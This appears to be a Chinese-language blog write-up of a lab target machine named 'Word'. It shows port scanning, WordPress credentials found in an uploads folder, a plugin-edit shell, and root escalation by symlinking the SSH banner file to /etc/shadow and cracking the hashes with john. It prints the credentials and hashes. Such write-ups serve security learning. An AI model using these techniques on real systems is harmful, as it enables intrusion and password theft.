@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 1.信息收集
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.66 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.0022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.66  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00026s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.66
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:51 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /wordpress/: Blog
+|_  /wordpress/wp-login.php: Wordpress login page.
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.66   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:01 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00028s latency).
+
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open|filtered snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open|filtered isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
+
+```
+常规开放22 80端口，udp保留，可以看到80是wordpress。">
+<meta property="og:title" content="Word">
+<meta property="og:description" content="# 1.信息收集
+```
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.66 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.0022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.66  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00026s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.66
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:51 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /wordpress/: Blog
+|_  /wordpress/wp-login.php: Wordpress login page.
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.66   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:01 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00028s latency).
+
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open|filtered snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open|filtered isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
+
+```
+常规开放22 80端口，udp保留，可以看到80是wordpress。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Word.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Word</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Word</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/24" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>1.信息收集</h1>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.66 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.0022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.66  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:50 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00026s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
+                                                                                                 
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.66
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:51 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /wordpress/: Blog
+|_  /wordpress/wp-login.php: Wordpress login page.
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.48 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.66   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:01 EST
+Nmap scan report for 192.168.2.66
+Host is up (0.00028s latency).
+
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   closed        msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open|filtered snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open|filtered isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:1C:BD:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
+
+</code></pre>
+<p>常规开放22 80端口，udp保留，可以看到80是wordpress。</p>
+<h1>2.web渗透</h1>
+<p>访问web主页源码提示，看来需要配置hosts文件</p>
+<pre class="notranslate"><code class="notranslate">&lt;!-- word.dsz --&gt;
+</code></pre>
+<p>配置后进入web，访问wordpress，常规进行目录扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# dirsearch -u http://192.168.2.66/wordpress/
+
+Target: http://192.168.2.66/
+
+[10:05:06] Starting: wordpress/
+[10:05:39] 301 -    0B  - /wordpress/index.php  -&gt;  http://192.168.2.66/wordpress/
+[10:05:39] 301 -    0B  - /wordpress/index.php/login/  -&gt;  http://192.168.2.66/wordpress/login/
+[10:05:42] 200 -    7KB - /wordpress/license.txt                            
+[10:05:55] 200 -    3KB - /wordpress/readme.html                            
+[10:06:11] 301 -  325B  - /wordpress/wp-admin  -&gt;  http://192.168.2.66/wordpress/wp-admin/
+[10:06:11] 400 -    1B  - /wordpress/wp-admin/admin-ajax.php                
+[10:06:11] 200 -    0B  - /wordpress/wp-config.php                          
+[10:06:11] 409 -    3KB - /wordpress/wp-admin/setup-config.php              
+[10:06:11] 302 -    0B  - /wordpress/wp-admin/  -&gt;  http://word.dsz/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.2.66%2Fwordpress%2Fwp-admin%2F&amp;reauth=1
+[10:06:11] 200 -  575B  - /wordpress/wp-admin/install.php
+[10:06:11] 200 -    0B  - /wordpress/wp-content/                            
+[10:06:11] 301 -  327B  - /wordpress/wp-content  -&gt;  http://192.168.2.66/wordpress/wp-content/
+[10:06:12] 200 -    0B  - /wordpress/wp-content/plugins/hello.php           
+[10:06:12] 200 -  422B  - /wordpress/wp-content/upgrade/                    
+[10:06:12] 200 -  461B  - /wordpress/wp-content/uploads/                    
+[10:06:12] 301 -  328B  - /wordpress/wp-includes  -&gt;  http://192.168.2.66/wordpress/wp-includes/
+[10:06:12] 200 -    0B  - /wordpress/wp-includes/rss-functions.php          
+[10:06:12] 200 -    0B  - /wordpress/wp-cron.php
+[10:06:12] 200 -    3KB - /wordpress/wp-login.php                           
+[10:06:12] 200 -    6KB - /wordpress/wp-includes/                           
+[10:06:12] 302 -    0B  - /wordpress/wp-signup.php  -&gt;  http://word.dsz/wordpress/wp-login.php?action=register
+[10:06:13] 405 -   42B  - /wordpress/xmlrpc.php
+</code></pre>
+<p>全部看一遍可以在upload下找到密码凭据，主页可以看到用户名是root，完整凭据</p>
+<pre class="notranslate"><code class="notranslate">root:S9ZF6mtLdHfmr8PmCq3i
+</code></pre>
+<p>常规wordpress改插件拿shell<br>
+![[Pasted image 20251115230958.png]]<br>
+在做目录爆破时已经的到了hello.php的路径，访问弹shell即可</p>
+<h1>3.提权</h1>
+<p>发现web主目录下有banner.php，内容大体改一下ssh的banner样式</p>
+<pre class="notranslate"><code class="notranslate">www-data@Word:/var/www/html$ cat banner.php 
+&lt;?php
+// 设置页面标题和字符编码
+$page_title = "定制你的SSH欢迎界面";
+$saved_message = "";
+
+// 处理表单提交
+if ($_SERVER["REQUEST_METHOD"] == "POST" &amp;&amp; isset($_POST['banner_text'])) {
+    $banner_text = $_POST['banner_text'];
+    $file_path = '/home/ssh-banner/banner.txt';
+    
+    // 确保目录存在
+    $dir = dirname($file_path);
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    
+    // 尝试保存文件
+    if (file_put_contents($file_path, $banner_text) !== false) {
+        $saved_message = "Banner Saved.  try ssh ";
+    } else {
+        $saved_message = "Banner Saved failed.";
+    }
+}
+
+// 尝试读取现有内容
+$current_content = "";
+$file_path = '/home/ssh-banner/banner.txt';
+if (file_exists($file_path)) {
+    $current_content = htmlspecialchars(file_get_contents($file_path));
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang="zh-CN"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;&lt;?php echo $page_title; ?&gt;&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+            margin-top: 20px;
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: monospace;
+            resize: vertical;
+        }
+        .btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #2980b9;
+        }
+        .message {
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 4px;
+            text-align: center;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .preview {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        .preview-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #3498db;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h1&gt;&lt;?php echo $page_title; ?&gt;&lt;/h1&gt;
+        
+        &lt;?php if (!empty($saved_message)): ?&gt;
+            &lt;div class="message &lt;?php echo strpos($saved_message, '错误') !== false ? 'error' : 'success'; ?&gt;"&gt;
+                &lt;?php echo $saved_message; ?&gt;
+            &lt;/div&gt;
+        &lt;?php endif; ?&gt;
+        
+        &lt;form method="POST" action=""&gt;
+            &lt;div class="form-group"&gt;
+                &lt;label for="banner_text"&gt;SSH欢迎信息内容：&lt;/label&gt;
+                &lt;textarea id="banner_text" name="banner_text" placeholder="在此输入SSH登录时显示的欢迎信息..."&gt;&lt;?php echo $current_content; ?&gt;&lt;/textarea&gt;
+            &lt;/div&gt;
+            
+            &lt;button type="submit" class="btn"&gt;保存Banner&lt;/button&gt;
+        &lt;/form&gt;
+        
+        &lt;?php if (!empty($current_content)): ?&gt;
+        &lt;div class="preview"&gt;
+            &lt;div class="preview-title"&gt;预览效果：&lt;/div&gt;
+            &lt;?php echo nl2br($current_content); ?&gt;
+        &lt;/div&gt;
+        &lt;?php endif; ?&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>在ssh-banner家目录下可以拿到user.txt，并且可以看到banner</p>
+<pre class="notranslate"><code class="notranslate">www-data@Word:/home/ssh-banner$ ls -al
+total 28
+drwxr-xr-x 2 ssh-banner ssh-banner 4096 Nov 15 03:51 .
+drwxr-xr-x 3 root       root       4096 Nov 14 21:59 ..
+lrwxrwxrwx 1 root       root          9 Nov 15 03:51 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ssh-banner ssh-banner  220 Nov 14 21:59 .bash_logout
+-rw-r--r-- 1 ssh-banner ssh-banner 3526 Nov 14 21:59 .bashrc
+-rw-r--r-- 1 ssh-banner ssh-banner  807 Nov 14 21:59 .profile
+-rwxrwxrwx 1 root       root        216 Nov 14 22:09 banner.txt
+-rw-r--r-- 1 root       root         44 Nov 14 22:10 user.txt
+
+</code></pre>
+<p>这里我之前存在权限误区，导致提权方向错误，经过群主指导完全解决</p>
+<p>可以看到banner.php代码内容会检查是否存在banner.txt文件，如果不存在则创建<br>
+可以看到banner的属组是root，但是并不代表banner.php的执行权限是root，这个banner文件是靶机制作时以root权限创建的，仅此而已</p>
+<p>banner.php基于apache2部署到web页面，所以执行权限是apache2的worker进程权限</p>
+<p>无论对于apache2或是nginx，web页面代码执行权限均是worker进程权限，对于apache2，第一个apache2进程为master进程，其余为worker进程，对于nginx，进程会表明master进程与worker进程</p>
+<pre class="notranslate"><code class="notranslate">www-data@Word:/home/ssh-banner$ ps -aux | grep apache2
+root         448  0.0  1.7 253924 34980 ?        Ss   09:49   0:00 /usr/sbin/apache2 -k start
+www-data     472  0.0  2.1 256892 43376 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
+www-data     474  0.0  2.4 330872 50900 ?        S    09:49   0:01 /usr/sbin/apache2 -k start
+www-data     475  0.0  3.0 333684 61368 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
+www-data     623  0.0  2.3 257672 47440 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
+www-data     626  0.0  2.3 257736 47656 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
+www-data     628  0.0  2.3 331100 48640 ?        S    09:51   0:00 /usr/sbin/apache2 -k start
+www-data     775  0.0  2.7 331760 55940 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
+www-data     776  0.0  2.4 329412 49912 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
+www-data     777  0.0  1.1 254472 23516 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
+www-data     780  0.0  1.9 254828 39028 ?        S    10:08   0:00 /usr/sbin/apache2 -k start
+www-data     946  0.0  0.0   6516   640 pts/0    S+   10:18   0:00 grep apache2
+
+</code></pre>
+<p>一顿翻找在dpkg -V中找到可疑文件，得到ssh-banner用户凭据</p>
+<pre class="notranslate"><code class="notranslate">www-data@Word:/home/ssh-banner$ dpkg -V 2&gt;/dev/null
+??5?????? c /etc/irssi.conf
+??5?????? c /etc/apache2/apache2.conf
+??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
+??5??????   /usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
+??5?????? c /etc/grub.d/10_linux
+??5?????? c /etc/grub.d/40_custom
+??5?????? c /etc/sudoers
+??5?????? c /etc/sudoers.d/README
+??5?????? c /etc/inspircd/inspircd.conf
+??5?????? c /etc/inspircd/inspircd.motd
+??5?????? c /etc/inspircd/inspircd.rules
+??5??????   /usr/bin/top
+??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla
+??5?????? c /etc/issue
+www-data@Word:/home/ssh-banner$ file /usr/bin/top 
+/usr/bin/top: Bourne-Again shell script, ASCII text executable
+www-data@Word:/home/ssh-banner$ cat /usr/bin/top 
+#!/bin/bash
+
+echo 'jUOhu37yYllYiVxQNw8G'
+systemctl restart ssh
+
+</code></pre>
+<p>到目前为止还有banner信息未使用，随便跑一次ssh可以看到，banner即为banner.txt中的内容，不过ssh仅仅展示banner，并不执行banner</p>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:~$ ps -aux | grep sshd
+root        1136  0.0  0.3  13288  7004 ?        Ss   10:32   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+ssh-ban+    1138  0.0  0.0   6516   644 pts/0    S+   10:32   0:00 grep sshd
+
+</code></pre>
+<p>可以看到ssh进程权限为root，而且在ssh config文件中可以看到会读取banner.txt</p>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:~$ cat /etc/ssh/sshd_config | grep banner
+# no default banner path
+Banner /home/ssh-banner/banner.txt
+
+</code></pre>
+<p>所以提权思路是，修改banner.txt文件，建立软连接指向shadow文件，因为sshd进程为root权限，所以在ssh连接时可以成功读取shadow文件，从而破解密码hash得到root权限</p>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:~$ rm -f banner.txt 
+ssh-banner@Word:~$ ln -s /etc/shadow banner.txt
+ssh-banner@Word:~$ ls -al | grep banner.txt 
+lrwxrwxrwx 1 ssh-banner ssh-banner   11 Nov 15 10:35 banner.txt -&gt; /etc/shadow
+
+</code></pre>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# ssh ssh-banner@192.168.2.66
+root:$6$2KzhPia8Wwzs7L/E$7aa6JS7MQvMCqzGn3Q4Q.4dIWFzuic/l/VxOCMsU95I4zNYCpXD6GXv2ixswndTcY/ow9475lR2Dx7j5VWagc0:20407:0:99999:7:::
+daemon:*:20166:0:99999:7:::
+bin:*:20166:0:99999:7:::
+sys:*:20166:0:99999:7:::
+sync:*:20166:0:99999:7:::
+games:*:20166:0:99999:7:::
+man:*:20166:0:99999:7:::
+lp:*:20166:0:99999:7:::
+mail:*:20166:0:99999:7:::
+news:*:20166:0:99999:7:::
+uucp:*:20166:0:99999:7:::
+proxy:*:20166:0:99999:7:::
+www-data:*:20166:0:99999:7:::
+backup:*:20166:0:99999:7:::
+list:*:20166:0:99999:7:::
+irc:*:20166:0:99999:7:::
+gnats:*:20166:0:99999:7:::
+nobody:*:20166:0:99999:7:::
+_apt:*:20166:0:99999:7:::
+systemd-timesync:*:20166:0:99999:7:::
+systemd-network:*:20166:0:99999:7:::
+systemd-resolve:*:20166:0:99999:7:::
+systemd-coredump:!!:20166::::::
+messagebus:*:20166:0:99999:7:::
+sshd:*:20166:0:99999:7:::
+mysql:!:20407:0:99999:7:::
+ssh-banner:$6$UNnjY.C7H66/tvez$yG9zHwkfnQY8LS0j52PFbeQWg3qUwaywqMnYXDswu10IbY2lgvhL8m1IqhDbHM0McJVnCt10FtWPg.yq87CL11:20407:0:99999:7:::
+ssh-banner@192.168.2.66's password: 
+</code></pre>
+<p>拿出hash john破解即可</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt  hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+********         (root)     
+1g 0:00:00:07 DONE (2025-11-15 10:37) 0.1386g/s 2627p/s 2627c/s 2627C/s sweetgurl..playas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>提权即可</p>
+<pre class="notranslate"><code class="notranslate">ssh-banner@Word:~$ su
+Password: 
+root@Word:/home/ssh-banner# cat /root/root.txt;cat /home/ssh-banner/user.txt 
+flag{root-a46ec67a0f2e7c387926ac5d783ea4b8}
+flag{user-3a9dc01d01eb76d0fdd0fafa9f5fda79}
+</code></pre>
+<p>写完wp，我最想说的是</p>
+<p><em>==<strong>SSH Banner配置进行提权，这是一个极其极其极其不常见但又极其极其极其合理的攻击向量</strong></em>==<br>
+附上ds的图<br>
+![[Pasted image 20251116094617.png]]</p>
